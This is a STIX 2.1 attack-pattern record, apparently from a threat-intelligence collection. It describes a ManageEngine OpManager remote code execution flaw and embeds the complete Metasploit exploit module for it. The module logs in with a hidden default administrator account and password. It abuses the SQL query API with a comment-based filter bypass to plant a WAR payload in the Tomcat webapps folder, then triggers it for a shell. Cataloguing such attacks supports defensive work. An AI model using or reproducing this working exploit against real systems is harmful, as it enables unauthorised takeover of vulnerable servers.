{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d2c79564-4361-4a10-853d-ff2fefbb89f5",
    "created": "2024-08-14T16:54:05.139719Z",
    "modified": "2024-08-14T16:54:05.139723Z",
    "name": "ManageEngine OpManager Remote Code Execution",
    "description": " This module exploits a default credential vulnerability in ManageEngine OpManager, where a default hidden account \"IntegrationUser\" with administrator privileges exists. The account has a default password of \"plugin\" which cannot be reset through the user interface. By log-in and abusing the default administrator's SQL query functionality, it's possible to write a WAR payload to disk and trigger an automatic deployment of this payload. This module has been tested successfully on OpManager v11.0 and v11.4-v11.6 for Windows.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manage_engine_opmanager_rce.rb",
            "external_id": "manage_engine_opmanager_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2015/Sep/66"
        },
        {
            "source_name": "reference",
            "url": "https://support.zoho.com/portal/manageengine/helpcenter/articles/pgsql-submitquery-do-vulnerability"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  # It removes large object in database, shoudn't be a problem, but just in case....\n  Rank = ManualRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'ManageEngine OpManager Remote Code Execution',\n      'Description'    => %q{\n        This module exploits a default credential vulnerability in ManageEngine OpManager, where a\n        default hidden account \"IntegrationUser\" with administrator privileges exists. The account\n        has a default password of \"plugin\" which cannot be reset through the user interface. By\n        log-in and abusing the default administrator's SQL query functionality, it's possible to\n        write a WAR payload to disk and trigger an automatic deployment of this payload. This\n        module has been tested successfully on OpManager v11.0 and v11.4-v11.6 for Windows.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'xistence <xistence[at]0x90.nl>' # Discovery, Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'EDB', '38174' ],\n          [ 'CVE', '2015-7765' ], # Hardcoded password\n          [ 'CVE', '2015-7766' ], # SQL query bypass\n          [ 'URL', 'https://seclists.org/fulldisclosure/2015/Sep/66' ],\n          [ 'URL', 'https://support.zoho.com/portal/manageengine/helpcenter/articles/pgsql-submitquery-do-vulnerability' ]\n        ],\n      'Platform'       => ['java'],\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          ['ManageEngine OpManager <= v11.6', {}]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-09-14',\n      'DefaultTarget'  => 0))\n  end\n\n  def uri\n    target_uri.path\n  end\n\n  def check\n    # Check version\n    vprint_status(\"Trying to detect ManageEngine OpManager\")\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(uri, 'LoginPage.do')\n    })\n\n    unless res && res.code == 200\n      return Exploit::CheckCode::Safe\n    end\n\n    if res.body =~ /OpManager.*v\\.([0-9]+\\.[0-9]+)<\\/span>/\n      version = $1\n      if Rex::Version.new(version) <= Rex::Version.new('11.6')\n        return Exploit::CheckCode::Appears\n      else\n        # Patch unknown\n        return Exploit::CheckCode::Detected\n      end\n    elsif res.body =~ /OpManager/\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def sql_query( key, query )\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'api', 'json', 'admin', 'SubmitQuery'),\n      'vars_get' => { 'apiKey' => key },\n      'vars_post'   => { 'query' => query }\n    })\n\n    unless res && res.code == 200\n      fail_with(Failure::Unknown, \"#{peer} - Query was not succesful!\")\n    end\n\n    res\n  end\n\n  def exploit\n    print_status(\"Access login page\")\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => normalize_uri(uri, 'jsp', 'Login.do'),\n      'vars_post' => {\n        'domainName' => 'NULL',\n        'authType' => 'localUserLogin',\n        'userName' => 'IntegrationUser', # Hidden user\n        'password' => 'plugin' # Password of hidden user\n      }\n    })\n\n    if res && res.code == 302\n      redirect =  URI(res.headers['Location']).to_s.gsub(/#\\//, \"\")\n      print_status(\"Location is [ #{redirect} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Access to login page failed!\")\n    end\n\n\n    # Follow redirection process\n    print_status(\"Following redirection\")\n    res = send_request_cgi({\n      'uri' => redirect,\n      'method' => 'GET'\n    })\n\n    if res && res.code == 200 && res.body =~ /window.(?:OPM.)?apiKey = \"([a-z0-9]+)\"/\n      api_key = $1\n      print_status(\"Retrieved API key [ #{api_key} ]\")\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Redirect failed!\")\n    end\n\n    app_base = rand_text_alphanumeric(4 + rand(32 - 4))\n    war_payload = payload.encoded_war({ :app_name => app_base }).to_s\n    war_payload_base64 = Rex::Text.encode_base64(war_payload).gsub(/\\n/, '')\n\n    print_status(\"Executing SQL queries\")\n\n    # Remove large object in database, just in case it exists from previous exploit attempts\n    sql = 'SELECT lo_unlink(-1)'\n    sql_query(api_key, sql)\n\n    # Create large object \"-1\". We use \"-1\" so we will not accidently overwrite large objects in use by other tasks.\n    sql = 'SELECT lo_create(-1)'\n    result = sql_query(api_key, sql)\n    if result.body =~ /lo_create\":([0-9]+)}/\n      lo_id = $1\n    else\n      fail_with(Failure::Unknown, \"#{peer} - Postgres Large Object ID not found!\")\n    end\n\n    # Insert WAR payload into the pg_largeobject table. We have to use /**/ to bypass OpManager'sa checks for INSERT/UPDATE/DELETE, etc.\n    sql = \"INSERT/**/INTO pg_largeobject (loid,pageno,data) VALUES(#{lo_id}, 0, DECODE('#{war_payload_base64}', 'base64'))\"\n    sql_query(api_key, sql)\n\n    # Export our large object id data into a WAR file\n    sql = \"SELECT lo_export(#{lo_id}, '..//..//tomcat//webapps//#{app_base}.war');\"\n    sql_query(api_key, sql)\n\n    # Remove our large object in the database\n    sql = 'SELECT lo_unlink(-1)'\n    sql_query(api_key, sql)\n\n    register_file_for_cleanup(\"tomcat//webapps//#{app_base}.war\")\n    register_file_for_cleanup(\"tomcat//webapps//#{app_base}\")\n\n    10.times do\n      select(nil, nil, nil, 2)\n\n      # Now make a request to trigger the newly deployed war\n      print_status(\"Attempting to launch payload in deployed WAR...\")\n      res = send_request_cgi(\n        {\n          'uri'    => normalize_uri(target_uri.path, app_base, \"#{Rex::Text.rand_text_alpha(rand(8) + 8)}.jsp\"),\n          'method' => 'GET'\n        })\n      # Failure. The request timed out or the server went away.\n      break if res.nil?\n      # Success! Triggered the payload, should have a shell incoming\n      break if res.code == 200\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-09-14",
    "x_mitre_platforms": [
        "['java']"
    ]
}